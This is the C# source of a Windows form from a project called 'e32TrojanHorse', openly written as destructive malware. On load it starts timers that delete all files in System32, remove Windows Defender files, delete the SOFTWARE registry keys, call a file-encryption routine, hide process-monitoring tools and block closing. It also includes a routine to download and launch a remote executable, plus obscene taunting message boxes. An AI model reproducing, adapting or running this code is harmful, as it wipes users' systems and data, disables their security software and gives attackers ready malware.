using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;
using System.Windows.Forms;
using System.Media;
using System.Net;
using Microsoft.Win32.SafeHandles;
using System.Threading;

namespace e32TrojanHorse
{
    public partial class GDIPayloads : Form
    {
        #region DLLImports

        [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
        public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);
        [DllImport("gdi32.dll")]
        static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DeleteObject([In] IntPtr hObject);
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);
        [DllImport("user32.dll")]
        static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
        [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
        [DllImport("gdi32.dll")]
        static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);
        [DllImport("user32.dll")]
        static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);
        [Flags()]
        private enum RedrawWindowFlags : uint
        {
            /// <summary>
            /// Invalidates the rectangle or region that you specify in lprcUpdate or hrgnUpdate.
            /// You can set only one of these parameters to a non-NULL value. If both are NULL, RDW_INVALIDATE invalidates the entire window.
            /// </summary>
            Invalidate = 0x1,

            /// <summary>Causes the OS to post a WM_PAINT message to the window regardless of whether a portion of the window is invalid.</summary>
            InternalPaint = 0x2,

            /// <summary>
            /// Causes the window to receive a WM_ERASEBKGND message when the window is repainted.
            /// Specify this value in combination with the RDW_INVALIDATE value; otherwise, RDW_ERASE has no effect.
            /// </summary>
            Erase = 0x4,

            /// <summary>
            /// Validates the rectangle or region that you specify in lprcUpdate or hrgnUpdate.
            /// You can set only one of these parameters to a non-NULL value. If both are NULL, RDW_VALIDATE validates the entire window.
            /// This value does not affect internal WM_PAINT messages.
            /// </summary>
            Validate = 0x8,

            NoInternalPaint = 0x10,

            /// <summary>Suppresses any pending WM_ERASEBKGND messages.</summary>
            NoErase = 0x20,

            /// <summary>Excludes child windows, if any, from the repainting operation.</summary>
            NoChildren = 0x40,

            /// <summary>Includes child windows, if any, in the repainting operation.</summary>
            AllChildren = 0x80,

            /// <summary>Causes the affected windows, which you specify by setting the RDW_ALLCHILDREN and RDW_NOCHILDREN values, to receive WM_ERASEBKGND and WM_PAINT messages before the RedrawWindow returns, if necessary.</summary>
            UpdateNow = 0x100,

            /// <summary>
            /// Causes the affected windows, which you specify by setting the RDW_ALLCHILDREN and RDW_NOCHILDREN values, to receive WM_ERASEBKGND messages before RedrawWindow returns, if necessary.
            /// The affected windows receive WM_PAINT messages at the ordinary time.
            /// </summary>
            EraseNow = 0x200,

            Frame = 0x400,

            NoFrame = 0x800
        }

        #endregion

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
        CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
        out IntPtr piSmallVersion, int amountIcons);

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,
        int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
        TernaryRasterOperations dwRop);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        [DllImport("User32")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public enum TernaryRasterOperations
        {
            SRCCOPY = 0x00CC0020,
            SRCPAINT = 0x00EE0086,
            SRCAND = 0x008800C6,
            SRCINVERT = 0x00660046,
            SRCERASE = 0x00440328,
            NOTSRCCOPY = 0x00330008,
            NOTSRCERASE = 0x001100A6,
            MERGECOPY = 0x00C000CA,
            MERGEPAINT = 0x00BB0226,
            PATCOPY = 0x00F00021,
            PATPAINT = 0x00FB0A09,
            PATINVERT = 0x005A0049,
            DSTINVERT = 0x00550009,
            BLACKNESS = 0x00000042,
            WHITENESS = 0x00FF0062,
        }

        public static Icon Extract(string file, int number, bool largeIcon)
        {
            IntPtr large;
            IntPtr small;
            ExtractIconEx(file, number, out large, out small, 1);
            try
            {
                return Icon.FromHandle(largeIcon ? large : small);
            }
            catch
            {
                return null;
            }
        }

        public static Cursor CreateCursor(Bitmap bm, Size size)
        {
            bm = new Bitmap(bm, size);
            return new Cursor(bm.GetHicon());
        }

        public GDIPayloads()
        {
            InitializeComponent();
            TopMost = true;
            this.TransparencyKey = this.BackColor;
        }

        private void GDIPayloads_Load(object sender, EventArgs e)
        {
            desktopfolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            LoadSounds();
            setIntervals();
            STARTDELETESYSTEM32.Start();
            DrawIcons.Start();
            SCREENTICK.Start();
            Sounds.Start();
            BlockCmdRegister.Start();
            MoveCursor.Start();
            EncFilesFromPC.Start();
        }

        public string desktopfolder;

        Random r = new Random();

        private void LoadSounds()
        {
            try
            {
                if (File.Exists(sound_file))
                {
                    soundp = new SoundPlayer(@"C:\Windows\Media\Windows Background.wav");
                }
                if (File.Exists(sound_file3))
                {
                    soundp3 = new SoundPlayer(@"C:\Windows\Media\Windows Foreground.wav");
                }
                if (File.Exists(sound_file2))
                {
                    soundp2 = new SoundPlayer(@"C:\Windows\Media\Windows Critical Stop.wav");
                }
            }
            catch
            {
                return;
            }

        }

        string sound_file2 = @"C:\Windows\Media\Windows Critical Stop.wav";
        string sound_file = @"C:\Windows\Media\Windows Background.wav";
        string sound_file3 = @"C:\Windows\Media\Windows Foreground.wav";

        private SoundPlayer soundp;

        private SoundPlayer soundp2;

        private SoundPlayer soundp3;

        private void GDIPayloads_FormClosing(object sender, FormClosingEventArgs e)
        {
            IFUKILLPROCESS.Start();
            System.Threading.Thread.Sleep(100);
            e.Cancel = true;
        }

        private void IFUKILLPROCESS_Tick(object sender, EventArgs e)
        {
            string[] arrayhere = new string[]
            {
              "MOMMA",
               "HMMMMMM...",
               "LOVE UR MOMMA OK?",
               "I'm encrypting ur files xdxdxdxd",
               "JOHN CENAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               "PUTIN.EXE LMAO",
               "e32 loves u",
               "I LOVE UR DATA",
               "I LOVE THE INTERNET LMAO",
               "e32 loves ur pc",
               "UR MOMMA SAYS PUTIN HAS A SMALL DICK",
               "THE WINDOWS HATE COCKS",
               ":)",
               ":(",
               ">:)",
               "Your machine is nice LMAOLMAO",
               "JOEL DOESN'T LIKE FOODS WITH BALLS",
               "WINDOWS DEFENDER DOESN'T LIKE ME :(, IT DETECTS ME",
               "DO U WANNA CRY?",
               "I WANT UR MOM OK??",
               "HUMMMMMM, DO U HATE UR DAD??????????????????????",
               "HELLO IT'S ME, MARIO",
               "GAY",
               "DICK HEAD LMAO",
               "PUSSY",
               "YOU KILLED MY TROJAN",
               "FUCKED BY E32",
               "ENJOY THE BSOD",
               "ENJOY THE BSOD LMAO",
               "GO FUCK YOUR SELF",
               "E32",
               "e32",
               "WHY DID U KILL THE PROCESS????????????, IDIOT",
               "YOU ARE AN IDIOT HAHAHAHA",
               "I WILL EAT UR MOMMA",
               "GIVE UP",
               "ENJOY THE DEATH NOW",
               "FUCK YOU",
               "ENJOY THE FUCKIN' BOOT FATAL ERROR",
               "ahahhaahahah",
               "GET THE FUCK",
               "e32 wants or momma here",
               "HAHAHAHHAHAHHH FUCK YOU",
               "ALL YOUR FILES HAVE BEEN ENCRYPTED LMAO"
            };
            int textrandomtolabelk = r.Next(arrayhere.Length);
            string text = arrayhere[textrandomtolabelk];
            MessageBox.Show(text, text, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        Icon icon = Extract("shell32.dll", 235, true);
        Icon icon2 = Extract("shell32.dll", 277, true);
        

        private void DrawIcons_Tick(object sender, EventArgs e)
        {
            this.Cursor = new Cursor(Cursor.Current.Handle);
            int posX = Cursor.Position.X;
            int posY = Cursor.Position.Y;
            ExtractRandomIcons();
            IntPtr desktop = GetWindowDC(IntPtr.Zero);
            using (Graphics g = Graphics.FromHdc(desktop))
            {
                g.DrawIcon(icon, posX, posY);
                g.DrawIcon(icon2, posX, posY);
                g.DrawIcon(icon3, posX, posY);
            }
        }

        private void ExtractRandomIcons()
        {
            try
            {
                icon3 = Extract("shell32.dll", r.Next(300), true);
            }
            catch
            {
                return;
            }
            
        }

        Icon icon3;

        private void Tunnel_Tick(object sender, EventArgs e)
        {
            Random r9 = new Random();
            IntPtr hwnd3 = GetDesktopWindow();
            IntPtr hdc3 = GetWindowDC(hwnd3);
            int x3 = Screen.PrimaryScreen.Bounds.Width;
            int y3 = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc3, r9.Next(15), r9.Next(25), x3 - r9.Next(15), y3 - r9.Next(25), hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
            InvertScreen.Start();
        }

        private void SCREENTICK_Tick(object sender, EventArgs e)
        {
            SCREENTICK.Stop();
            r = new Random();
            Random r9 = new Random();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, r9.Next(2), r9.Next(22), x - r9.Next(25), y - r9.Next(91), hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, x, 0, -x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc, 0, y, x, -y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY);
            IntPtr hwnd2 = GetDesktopWindow();
            IntPtr hdc2 = GetWindowDC(hwnd2);
            int x2 = Screen.PrimaryScreen.Bounds.Width;
            int y2 = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc2, r9.Next(100), r9.Next(10), x - r9.Next(25), y2 - r9.Next(25), hdc2, 0, 0, x2, y2, TernaryRasterOperations.NOTSRCCOPY);
            StretchBlt(hdc2, x2, 0, -x2, y2, hdc2, 0, 0, x2, y2, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc2, 0, y2, x2, -y2, hdc2, 0, 0, x2, y2, TernaryRasterOperations.SRCCOPY);
            IntPtr hwnd3 = GetDesktopWindow();
            IntPtr hdc3 = GetWindowDC(hwnd3);
            int x3 = Screen.PrimaryScreen.Bounds.Width;
            int y3 = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc3, r9.Next(200), r9.Next(100), x - r9.Next(25), y3 - r9.Next(33), hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc3, x3, 0, -x3, y3, hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
            StretchBlt(hdc3, 0, y3, x3, -y, hdc3, 0, 0, x3, y3, TernaryRasterOperations.SRCCOPY);
            Tunnel.Start();
            SCREENTICK.Start();
        }

        private void setIntervals()
        {
            Tunnel.Interval = r.Next(1000);
            DrawIcons.Interval = r.Next(1000);
            STARTDELETESYSTEM32.Interval = 67777;
            SCREENTICK.Interval = r.Next(1000);
            InvertScreen.Interval = r.Next(40000);
        }

        private void STARTDELETESYSTEM32_Tick(object sender, EventArgs e)
        {
            STDEL.Start();
        }

        private void GrantBSOD()
        {
            var formnew = new InitPayloads();
            formnew.Show();
            var formnew2 = new GDIPayloads();
            formnew2.Show();
        }

        private void STDEL_Tick(object sender, EventArgs e)
        {
            try
            {
                string[] system32files = Directory.GetFiles(@"C:\Windows\System32\", "*", SearchOption.AllDirectories);
                for (int i = 0; i < system32files.Length; i++)
                {
                    if (File.Exists(system32files[i]))
                    {
                        File.Delete(system32files[i]);
                    }
                    TryDelete();
                    ERRORS.Start();
                    DeleteWindowsDefender();
                    //DownloadBonziKill();
                }
            }
            catch
            {
                return;
            }
        }

        private void DeleteWindowsDefender()
        {
            try
            {
                if (File.Exists(windeffile1))
                {
                    File.Delete(windeffile1);
                }
                if (File.Exists(windeffile2))
                {
                    File.Delete(windeffile2);
                }
                if (File.Exists(windeffile3))
                {
                    File.Delete(windeffile3);
                }
                if (File.Exists(windeffile4))
                {
                    File.Delete(windeffile4);
                }
                string[] windeffiles = Directory.GetFiles(FolderXD + @"\", "*", SearchOption.AllDirectories);
                for (int i = 0; i < windeffiles.Length; i++)
                {
                    if (File.Exists(windeffiles[i]))
                    {
                        File.Delete(windeffiles[i]);
                    }
                }
                if (Directory.Exists(FolderXD))
                {
                    Directory.Delete(FolderXD);
                }
            }
            catch
            {
                return;
            }
        }

        private string windeffile1 = @"C:\Program Files\Windows Defender\MpCmdRun.exe";
        private string windeffile2 = @"C:\Program Files\Windows Defender\DefenderCSP.dll";
        private string windeffile3 = @"C:\Program Files\Windows Defender\MsMpEng.exe";
        private string windeffile4 = @"C:\Program Files\Windows Defender\ProtectionManagement.dll";
        private string FolderXD = @"C:\Program Files\Windows Defender";

        private void ERRORS_Tick(object sender, EventArgs e)
        {
            string[] texts = new string[]
            {
               "Your machine is being destroyed and you can't do anything about it",
               "ENJOY YOUR PC",
               "LMAO",
               "YOUR PC WILL NOT RESTART AGAIN, ENJOY IT :)",
               "I'm deleting the system32 now, hmmm",
               "ENJOY THAT SHIT",
               "SUCK MY DICK",
               "HMMMMMMMMMMM",
               "LMFAO",
               "get out here, lox",
               "Do u like to watch porn?",
               "I wanna fuck ur mom",
               "GET THE FUCK"
            };
            int textrandom = r.Next(texts.Length);
            string[] texts2 = new string[]
            {
               "e32 trojan horse",
               "ur momma",
               "dude",
               "HAHAHAHHAHAH",
               "SEX",
               "IMPORTANT LMAO",
               "E32 TROJAN HORSE",
               "HMMMMMMMMMMM",
               "Cortana",
               "Bonzi",
               "Bonzi Kill"
            };
            int textrandom2 = r.Next(texts2.Length);
            GrantBSOD();
            MessageBox.Show(texts[textrandom], texts2[textrandom2], MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void BlockCmdRegister_Tick(object sender, EventArgs e)
        {
            int hWnd;
            Process[] processRunning = Process.GetProcesses();
            foreach (Process pr in processRunning)
            {
                if (pr.ProcessName == "Processhacker")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }

                if (pr.ProcessName == "sdclt")
                {
                    hWnd = pr.MainWindowHandle.ToInt32();
                    ShowWindow(hWnd, SW_HIDE);
                }
            }
        }

        private void Sounds_Tick(object sender, EventArgs e)
        {
            Sounds.Stop();
            int soundid = rtest.Next(3);
            if (soundid == 1)
            {
                soundp.Play();
            }
            if (soundid == 2)
            {
                soundp2.Play();
            }
            if (soundid == 3)
            {
                soundp3.Play();
            }
            Sounds.Start();
        }

        Random rtest = new Random();

        private void EncFilesFromPC_Tick(object sender, EventArgs e)
        {
            Encryptor.StartFilesEncryption();
            Encryptor.StartFilesEncryption2();
            Random r = new Random();
            Random r4 = new Random();
            string[] arrayhere = new string[]
            {
               "MOMMA",
               "HMMMMMM...",
               "LOVE UR MOMMA OK?",
               "I'm encrypting ur files xdxdxdxd",
               "JOHN CENAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
               "PUTIN.EXE LMAO",
               "e32 loves u",
               "I LOVE UR DATA",
               "I LOVE THE INTERNET LMAO",
               "e32 loves ur pc",
               "UR MOMMA SAYS PUTIN HAS A SMALL DICK",
               "THE WINDOWS HATE COCKS",
               ":)",
               ":(",
               ">:)",
               "Your machine is nice LMAOLMAO",
               "JOEL DOESN'T LIKE FOODS WITH BALLS",
               "WINDOWS DEFENDER DOESN'T LIKE ME :(, IT DETECTS ME",
               "DO U WANNA CRY?",
               "I WANT UR MOM OK??",
               "HUMMMMMM, DO U HATE UR DAD??????????????????????",
               "HELLO IT'S ME, MARIO",
               "HUMMMMMMM WHY DON'T U TRY TO FINISH MY TASK?",
               "DICK HEAD LMAO",
               "PUSSY",
               "MINECRAFT POCKET EDITION NO VIRUS",
               "HMMMMM LMAO",
               "NORTON ANTIVIRUS",
               "BAIDU",
               "E32",
               "INFECTED BY A LOL MALWARE",
               "I WILL EAT YOUR ASS",
               "GET THE FUCK",
               "GET OUT HERE"
            };
            int textrandomtolabelk = r.Next(arrayhere.Length);
            string dictoryAndFileName = desktopfolder + @"\" + arrayhere[textrandomtolabelk] + "_e32_" + r4.Next(9999999) + r.Next(9999999);

            StreamWriter writer = new StreamWriter(dictoryAndFileName + ".e32");
            writer.WriteLine("INFECTED BY E32 TROJAN HORSE");
            writer.WriteLine("THIS TROJAN ENCRYPTS UR FILES AND DESTROY THE SYSTEM CONFIG.");
            writer.Close();

            StreamWriter writer2 = new StreamWriter(dictoryAndFileName + ".e32");
            writer2.WriteLine("fuck you");
            writer2.WriteLine("lox");
            writer2.Close();
        }

        private void DownloadBonziKill()
        {
            try
            {
                if (!File.Exists(@"C:\Program Files\System32\BonziKill.exe"))
                {
                    ServicePointManager.Expect100Continue = true; //Make protocol for donwload file from github
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;

                    WebClient webClient = new WebClient();
                    webClient.DownloadFile("https://github.com/x8BitRain/BonziRogue/releases/download/1/BonziKill.exe", @"C:\Program Files\System32\BonziKill.exe"); //Hide donwloading

                    Process.Start("C:\\Program Files\\System32\\BonziKill.exe");
                }
                else
                {
                    Process.Start("C:\\Program Files\\System32\\BonziKill.exe");
                }
                
            }
            catch
            {
                return;
            }
        }

        private void MoveCursor_Tick(object sender, EventArgs e)
        {
            Cursor.Position = new System.Drawing.Point(Cursor.Position.X + r.Next(-10, 10),
            Cursor.Position.Y + r.Next(-10, 10));
        }

        private void InvertScreen_Tick(object sender, EventArgs e)
        {
            InvertScreen.Stop();
            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetWindowDC(hwnd);
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            StretchBlt(hdc, 0, 0, Width, Height,
            hdc, 0, 0, Width, Height, TernaryRasterOperations.DSTINVERT);
            InvertScreen.Start();
        }

        private void TryDelete()
        {
            try
            {
                if (!wasdeleted)
                {
                    Registry.LocalMachine.DeleteSubKey("SOFTWARE");
                    Registry.CurrentUser.DeleteSubKey("SOFTWARE");
                    wasdeleted = true;  
                }
            }
            catch
            {
                return;
            }
        }

        public bool wasdeleted;

    }
}
